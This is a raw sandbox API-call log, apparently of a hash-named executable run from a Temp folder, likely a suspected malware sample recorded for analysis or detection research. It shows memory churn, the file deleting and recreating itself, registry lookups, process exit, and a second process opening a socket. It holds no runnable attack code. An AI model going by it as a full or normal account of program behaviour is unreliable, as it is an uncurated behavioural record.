NtFreeVirtualMemory,0xffffffff#3368#2072576#0x02470000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2080768#4096#0xffffffff#0#3368#0x02470000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2076672#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2084864#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2080768#0x02470000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2088960#4096#0xffffffff#0#3368#0x02470000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2084864#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2093056#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2088960#0x02470000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2097152#4096#0xffffffff#0#3368#0x02470000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2093056#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2101248#4096#0xffffffff#0#3368#0x02670000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2097152#0x02470000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2113536#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2101248#0x02670000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2121728#4096#0xffffffff#0#3368#0x02480000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2113536#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2125824#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2121728#0x02480000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2129920#4096#0xffffffff#0#3368#0x02480000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2125824#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2134016#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2129920#0x02480000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2146304#4096#0xffffffff#0#3368#0x02480000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2134016#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2158592#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2146304#0x02480000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2162688#4096#0xffffffff#0#3368#0x02480000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2158592#0x02270000#32768,0,1542888075.546375
NtAllocateVirtualMemory,0#0#2166784#4096#0xffffffff#0#3368#0x02690000#4,0,1542888075.546375
NtFreeVirtualMemory,0xffffffff#3368#2162688#0x02480000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2174976#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2166784#0x02690000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2179072#4096#0xffffffff#0#3368#0x02490000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2174976#0x02270000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2183168#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2179072#0x02490000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2195456#4096#0xffffffff#0#3368#0x02490000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2183168#0x02270000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2203648#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2195456#0x02490000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2207744#4096#0xffffffff#0#3368#0x02490000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2203648#0x02270000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2211840#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2207744#0x02490000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2220032#4096#0xffffffff#0#3368#0x02490000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2211840#0x02270000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2228224#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2220032#0x02490000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2236416#4096#0xffffffff#0#3368#0x02490000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2228224#0x02270000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2240512#4096#0xffffffff#0#3368#0x026c0000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2236416#0x02490000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2244608#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2240512#0x026c0000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2252800#4096#0xffffffff#0#3368#0x024a0000#4,0,1542888075.562375
NtFreeVirtualMemory,0xffffffff#3368#2244608#0x02270000#32768,0,1542888075.562375
NtAllocateVirtualMemory,0#0#2256896#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2252800#0x024a0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2273280#4096#0xffffffff#0#3368#0x024a0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2256896#0x02270000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2277376#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2273280#0x024a0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2281472#4096#0xffffffff#0#3368#0x024a0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2277376#0x02270000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2285568#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2281472#0x024a0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2289664#4096#0xffffffff#0#3368#0x024a0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2285568#0x02270000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2293760#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2289664#0x024a0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2297856#4096#0xffffffff#0#3368#0x024a0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2293760#0x02270000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2301952#4096#0xffffffff#0#3368#0x026e0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2297856#0x024a0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2306048#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2301952#0x026e0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2310144#4096#0xffffffff#0#3368#0x024b0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2306048#0x02270000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2314240#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2310144#0x024b0000#32768,0,1542888075.578375
NtAllocateVirtualMemory,0#0#2318336#4096#0xffffffff#0#3368#0x024b0000#4,0,1542888075.578375
NtFreeVirtualMemory,0xffffffff#3368#2314240#0x02270000#32768,0,1542888075.593375
NtAllocateVirtualMemory,0#0#2318336#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.593375
NtFreeVirtualMemory,0xffffffff#3368#2318336#0x024b0000#32768,0,1542888075.593375
NtFreeVirtualMemory,0xffffffff#3368#2318336#0x01b60000#32768,0,1542888075.593375
DeleteFileW,C:\Users\mag\AppData\Local\Temp\[5d9a89b68b4e55a4e49ff2bf2dcec566]#C:\Users\mag\AppData\Local\Temp\[5d9a89b68b4e55a4e49ff2bf2dcec566],0,1542888075.593375
NtOpenFile,2113568#C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#7#0x00110080#0x000000e4#1#\??\C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe,0,1542888075.593375
NtQueryInformationFile,35#0x000000e4,0,1542888075.593375
NtSetInformationFile,10#0x000000e4,0,1542888075.593375
NtClose,0x000000e4,0,1542888075.593375
NtOpenFile,16417#C:\#0#0x00100000#0x000000e4#1#\??\C:\,0,1542888075.593375
NtQueryInformationFile,9#0x000000e4,0,1542888075.593375
NtClose,0x000000e4,0,1542888075.593375
NtCreateFile,\??\C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#96#2#5#C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#0#0x40100080#0x000000e4#128,0,1542888075.593375
NtClose,0x000000e4,0,1542888075.593375
NtFreeVirtualMemory,0xffffffff#3368#2318336#0x02270000#32768,0,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,50,16,1542888076.609375
GetSystemMetrics,12,32,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
GetSystemMetrics,31,21,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
NtClose,0x00000158,0,1542888076.609375
RegOpenKeyExW,0#SOFTWARE\Microsoft\CTF\Compatibility\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\Compatibility\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe,2,1542888076.609375
GetSystemDirectoryW,C:\Windows\system32,19,1542888076.609375
LdrLoadDll,0#0#C:\Windows\system32\ole32.dll#0x76540000#ole32,0,1542888076.609375
LdrGetProcedureAddress,ole32#0x765809ad#0#0x76540000#CoInitializeEx,0,1542888076.609375
LdrGetProcedureAddress,ole32#0x765886d3#0#0x76540000#CoUninitialize,0,1542888076.609375
CoInitializeEx,2,1,1542888076.609375
LdrGetProcedureAddress,ole32#0x76587660#0#0x76540000#CoRegisterInitializeSpy,0,1542888076.609375
LdrGetProcedureAddress,ole32#0x76589784#0#0x76540000#CoRevokeInitializeSpy,0,1542888076.609375
NtClose,0x00000158,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
RegOpenKeyExW,0#Software\Microsoft\CTF\TIP\{0000897b-83df-4b96-be07-0fb58b01c4a4}\LanguageProfile\0x00000000\{0001bea3-ed56-483d-a2e2-aeae25577436}#0x000000e4#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\CTF\TIP\{0000897b-83df-4b96-be07-0fb58b01c4a4}\LanguageProfile\0x00000000\{0001bea3-ed56-483d-a2e2-aeae25577436},0,1542888076.609375
RegQueryValueExW,1#Enable#0x000000e4#4#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\TIP\{0000897b-83df-4b96-be07-0fb58b01c4a4}\LanguageProfile\0x00000000\{0001bea3-ed56-483d-a2e2-aeae25577436}\Enable,0,1542888076.609375
RegCloseKey,0x000000e4,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
NtClose,0x00000158,0,1542888076.609375
NtClose,0x00000158,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
GetSystemMetrics,8192,0,1542888076.609375
NtOpenMutant,0x000000e4#0x00100000#CicLoadWinStaWinSta0,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.609375
NtOpenMutant,0x000000e4#0x00100000#Local\MSCTF.CtfMonitorInstMutexDefault1,0,1542888076.609375
NtClose,0x000000e4,0,1542888076.625375
RegOpenKeyExW,0#SOFTWARE\Microsoft\CTF\#0x000000e4#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\,0,1542888076.625375
RegQueryValueExW,#EnableAnchorContext#0x000000e4#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\EnableAnchorContext,2,1542888076.625375
RegCloseKey,0x000000e4,0,1542888076.625375
RegOpenKeyExW,0#SOFTWARE\Microsoft\CTF\KnownClasses#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\KnownClasses,2,1542888076.625375
LdrGetDllHandle,0#USER32#0x77960000,0,1542888076.625375
FindResourceExW,0##32512##14#0x77960000,0,1542888076.625375
FindResourceExW,0##32512##22#0x77960000,0,1542888076.625375
GetSystemMetrics,31,21,1542888076.625375
GetSystemMetrics,31,21,1542888076.625375
GetSystemMetrics,31,21,1542888076.625375
GetSystemMetrics,31,21,1542888076.625375
GetSystemMetrics,31,21,1542888076.625375
GetSystemMetrics,31,21,1542888076.625375
GetSystemMetrics,50,16,1542888076.625375
GetSystemMetrics,12,32,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,50,16,1542888076.640375
GetSystemMetrics,12,32,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.640375
GetSystemMetrics,31,21,1542888076.656375
GetSystemMetrics,31,21,1542888076.656375
GetSystemMetrics,31,21,1542888076.656375
GetSystemMetrics,31,21,1542888076.656375
GetSystemMetrics,50,16,1542888076.656375
GetSystemMetrics,12,32,1542888076.656375
GetSystemMetrics,31,21,1542888076.656375
GetSystemMetrics,31,21,1542888076.656375
NtClose,0x000000dc,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.656375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.656375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.656375
LdrUnloadDll,kernel32#0x760b0000,0,1542888076.671375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.671375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.671375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.671375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.671375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.671375
LdrUnloadDll,ADVAPI32#0x77730000,0,1542888076.671375
LdrUnloadDll,USER32#0x77960000,0,1542888076.671375
CoUninitialize,,0,1542888076.671375
CoUninitialize,,0,1542888076.671375
UnhookWindowsHookEx,0x002b028d,1,1542888076.671375
UnhookWindowsHookEx,0x00440209,1,1542888076.671375
NtClose,0x000000bc,0,1542888076.671375
SetUnhandledExceptionFilter,,4630615,1542888076.671375
NtTerminateProcess,0x00000000#0x00000000#0,0,1542888076.671375
NtTerminateProcess,0x00000000#0x00000000#0,0,1542888076.671375
NtClose,0x00000148,0,1542888076.671375
NtClose,0x00000140,0,1542888076.671375
NtClose,0x00000144,0,1542888076.671375
NtClose,0x0000013c,0,1542888076.671375
NtClose,0x00000134,0,1542888076.671375
NtClose,0x00000130,0,1542888076.671375
NtClose,0x0000014c,0,1542888076.671375
NtClose,0x000000c4,0,1542888076.671375
NtClose,0x000000c0,0,1542888076.671375
NtClose,0x0000001c,0,1542888076.671375
NtClose,0x000000a0,0,1542888076.671375
NtClose,0x0000009c,0,1542888076.671375
NtClose,0x00000098,0,1542888076.671375
NtClose,0x00000094,0,1542888076.671375
NtUnmapViewOfSection,0xffffffff#3368#8192#0x00220000,0,1542888076.671375
NtClose,0x00000090,0,1542888076.671375
NtClose,0x0000008c,0,1542888076.671375
NtClose,0x0000006c,0,1542888076.671375
NtClose,0x00000064,0,1542888076.671375
NtClose,0x00000058,0,1542888076.671375
NtClose,0x0000005c,0,1542888076.671375
NtClose,0x00000060,0,1542888076.671375
NtClose,0x00000068,0,1542888076.671375
NtClose,0x00000054,0,1542888076.671375
NtClose,0x00000050,0,1542888076.671375
NtClose,0x00000048,0,1542888076.671375
NtClose,0x000000f4,0,1542888076.671375
NtFreeVirtualMemory,0xffffffff#3368#65536#0x003f0000#32768,0,1542888076.671375
NtClose,0x00000040,0,1542888076.687375
NtClose,0x00000044,0,1542888076.687375
NtClose,0x0000003c,0,1542888076.687375
NtClose,0x00000038,0,1542888076.687375
NtClose,0x00000034,0,1542888076.687375
LdrUnloadDll,IMM32#0x777d0000,0,1542888076.687375
NtOpenKey,0x00020019#0x00000034#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\GRE_Initialize,0,1542888076.687375
NtQueryValueKey,0x00000034#2##0##HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize\DisableMetaFiles,3221225524,1542888076.687375
NtClose,0x00000034,0,1542888076.687375
NtTerminateProcess,0xffffffff#0x00000000#3368,0,1542888076.687375
GetSystemTimeAsFileTime,,0,1542888074.703
SetUnhandledExceptionFilter,,0,1542888074.703
LdrGetDllHandle,0#libgcc_s_dw2-1.dll#0x00000000,3221225781,1542888074.703
LdrGetDllHandle,0#libgcc_s_dw2-1.dll#0x00000000,3221225781,1542888074.703
NtDuplicateObject,0x00000068#0xffffffff#2516#2#0xffffffff#0x00000000#2516#0#0xfffffffe,0,1542888074.703
NtAllocateVirtualMemory,0#0#20480#4096#0xffffffff#0#2516#0x006a5000#4,0,1542888074.703
WSAStartup,514,0,1542888074.703
GetSystemTimeAsFileTime,,0,1542888074.703
GetSystemInfo,1,0,1542888074.703
SetErrorMode,32771,32775,1542888074.703
LdrGetDllHandle,0#ntdll.dll#0x77a30000,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a83bf5#0#0x77a30000#RtlNtStatusToDosError,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a75858#0#0x77a30000#NtDeviceIoControlFile,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a76018#0#0x77a30000#NtQueryInformationFile,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a76638#0#0x77a30000#NtSetInformationFile,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a76268#0#0x77a30000#NtQueryVolumeInformationFile,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a75f98#0#0x77a30000#NtQueryDirectoryFile,0,1542888074.703
LdrGetProcedureAddress,ntdll#0x77a761f8#0#0x77a30000#NtQuerySystemInformation,0,1542888074.703
LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x7613fc2f#0#0x760b0000#GetQueuedCompletionStatusEx,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x7610efdd#0#0x760b0000#SetFileCompletionNotificationModes,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x7613b4a9#0#0x760b0000#CreateSymbolicLinkW,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x760f407b#0#0x760b0000#CancelIoEx,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x77a89911#0#0x760b0000#InitializeConditionVariable,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x760e2efc#0#0x760b0000#SleepConditionVariableCS,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x760e1fb2#0#0x760b0000#SleepConditionVariableSRW,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x77a545c5#0#0x760b0000#WakeAllConditionVariable,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x77ad5ad3#0#0x760b0000#WakeConditionVariable,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x7613a599#0#0x760b0000#CancelSynchronousIo,0,1542888074.703
LdrGetProcedureAddress,kernel32#0x760e501e#0#0x760b0000#GetFinalPathNameByHandleW,0,1542888074.703
RegOpenKeyExW,0#SOFTWARE\Microsoft\OLE#0x00000084#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLE,0,1542888074.703
RegQueryValueExW,#PageAllocatorUseSystemHeap#0x00000084#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\PageAllocatorUseSystemHeap,2,1542888074.703
RegCloseKey,0x00000084,0,1542888074.718
RegOpenKeyExW,0#SOFTWARE\Microsoft\OLE#0x00000084#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLE,0,1542888074.718
RegQueryValueExW,#PageAllocatorSystemHeapIsPrivate#0x00000084#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\PageAllocatorSystemHeapIsPrivate,2,1542888074.718
RegCloseKey,0x00000084,0,1542888074.718
GetSystemInfo,1,0,1542888074.718
LdrGetDllHandle,0#rpcrt4.dll#0x76400000,0,1542888074.718
LdrGetProcedureAddress,RPCRT4#0x7642aefd#0#0x76400000#I_RpcInitNdrImports,0,1542888074.718
RegOpenKeyExW,0#Software\Microsoft\OLE\Tracing#0x00000000#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\OLE\Tracing,2,1542888074.718
NtOpenDirectoryObject,0x000000a0#0x0000000f#\Sessions\1\BaseNamedObjects#\Sessions\1\BaseNamedObjects,0,1542888074.718
GetSystemDirectoryW,C:\Windows\system32,19,1542888074.718
RegOpenKeyExA,0#SOFTWARE\Microsoft\OLEAUT#0x00000000#0x80000002#0x00000001#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLEAUT,2,1542888074.718
RegOpenKeyExA,0#SOFTWARE\Microsoft\OLEAUT#0x00000000#0x80000002#0x00000001#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\OLEAUT,2,1542888074.718
GetSystemWindowsDirectoryW,C:\Windows,10,1542888074.718
GetSystemWindowsDirectoryW,C:\Windows,10,1542888074.718
LoadStringW,Insufficient memory#4#0x76250000,19,1542888074.718
GetSystemWindowsDirectoryW,C:\Windows,10,1542888074.718
GetSystemDirectoryW,C:\Windows\system32,19,1542888074.718
RegOpenKeyExW,0#Software\Microsoft\Windows\CurrentVersion\Setup#0x000000b0#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Setup,0,1542888074.718
LdrLoadDll,0#0#API-MS-Win-Core-LocalRegistry-L1-1-0.dll#0x760b0000#API-MS-Win-Core-LocalRegistry-L1-1-0,0,1542888074.718
LdrGetProcedureAddress,kernel32#0x760fd457#0#0x760b0000#RegQueryValueExW,0,1542888074.718
RegQueryValueExW,#SourcePath#0x000000b0#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\SourcePath,2,1542888074.718
RegCloseKey,0x000000b0,0,1542888074.718
RegOpenKeyExW,0#Software\Microsoft\Windows\CurrentVersion#0x000000b0#0x80000002#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion,0,1542888074.718
RegQueryValueExW,%SystemRoot%\inf#DevicePath#0x000000b0#2#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\DevicePath,0,1542888074.718
RegCloseKey,0x000000b0,0,1542888074.718
NtCreateMutant,0x000000b4#0x001f0001#0#,0,1542888074.718
NtCreateMutant,0x000000bc#0x001f0001#0#,0,1542888074.718
GetNativeSystemInfo,1,0,1542888074.718
GetSystemWindowsDirectoryW,C:\Windows,10,1542888074.718
GetSystemWindowsDirectoryW,C:\Windows,10,1542888074.718
NtClose,0x000000c0,0,1542888074.718
LdrLoadDll,0#0#powrprof.dll#0x745b0000#powrprof,0,1542888074.718
LdrGetProcedureAddress,powrprof#0x004c6150#0#0x745b0000#PowerRegisterSuspendResumeNotification,3221225785,1542888074.718
WSAStartup,514,0,1542888074.718
socket,1#0#196#2,196,1542888074.718
NtQueryAttributesFile,C:\Windows\System32\WSHTCPIP.DLL#\??\C:\Windows\System32\wshtcpip.dll,0,1542888074.718
NtCreateFile,\??\C:\Windows\System32\en-US\wshtcpip.dll.mui#0#1#1#C:\Windows\System32\en-US\wshtcpip.dll.mui#5#0x80100080#0x000000c8#0,0,1542888074.718
NtCreateSection,0x00000000#0x000000cc#0x000f0005#0x000000c8##8,0,1542888074.718
NtMapViewOfSection,8#0##0#0x01720000#0x000000cc#0xffffffff#2516#0#4096,0,1542888074.718
NtClose,0x000000cc,0,1542888074.718
LdrUnloadDll,wshtcpip#0x75140000,0,1542888074.718
NtQueryAttributesFile,C:\Windows\System32\WSHTCPIP.DLL#\??\C:\Windows\System32\wshtcpip.dll,0,1542888074.718
LdrUnloadDll,wshtcpip#0x75140000,0,1542888074.718
NtQueryAttributesFile,C:\Windows\System32\WSHTCPIP.DLL#\??\C:\Windows\System32\wshtcpip.dll,0,1542888074.718
LdrUnloadDll,wshtcpip#0x75140000,0,1542888074.718
NtQueryAttributesFile,C:\Windows\System32\wship6.dll#\??\C:\Windows\System32\wship6.dll,0,1542888074.718
NtCreateFile,\??\C:\Windows\System32\wship6.dll#96#1#1#C:\Windows\System32\wship6.dll#5#0x80100080#0x000000cc#0,0,1542888074.718
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.718
NtMapViewOfSection,4#0##0#0x755e0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.718
NtClose,0x000000d0,0,1542888074.718
NtClose,0x000000cc,0,1542888074.718
NtCreateFile,\??\C:\Windows\System32\en-US\wship6.dll.mui#0#1#1#C:\Windows\System32\en-US\wship6.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.718
NtCreateSection,0x00000000#0x000000d0#0x000f0005#0x000000cc##8,0,1542888074.718
NtMapViewOfSection,8#0##0#0x01730000#0x000000d0#0xffffffff#2516#0#4096,0,1542888074.718
NtClose,0x000000d0,0,1542888074.718
NtUnmapViewOfSection,0xffffffff#2516#4096#0x01730000,0,1542888074.718
NtClose,0x000000cc,0,1542888074.718
NtUnmapViewOfSection,0xffffffff#2516#4096#0x755e0000,0,1542888074.718
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.718
NtQueryAttributesFile,C:\Windows\System32\wship6.dll#\??\C:\Windows\System32\wship6.dll,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.718
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.718
NtCreateFile,\??\C:\Windows\System32\wship6.dll#96#1#1#C:\Windows\System32\wship6.dll#5#0x80100080#0x000000cc#0,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#12288#0x00313000#16384,0,1542888074.718
NtCreateSection,0x00000000#0x000000d0#0x00000007#0x000000cc##2,0,1542888074.718
NtMapViewOfSection,4#0##0#0x755e0000#0x000000d0#0xffffffff#2516#0#24576,0,1542888074.718
NtClose,0x000000d0,0,1542888074.718
NtClose,0x000000cc,0,1542888074.718
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#2516#0x00313000#4,0,1542888074.718
NtCreateFile,\??\C:\Windows\System32\en-US\wship6.dll.mui#0#1#1#C:\Windows\System32\en-US\wship6.dll.mui#5#0x80100080#0x000000cc#0,0,1542888074.718
NtFreeVirtualMemory,0xffffffff#2516#61440#0x00300000#16384,0,1542888074.718
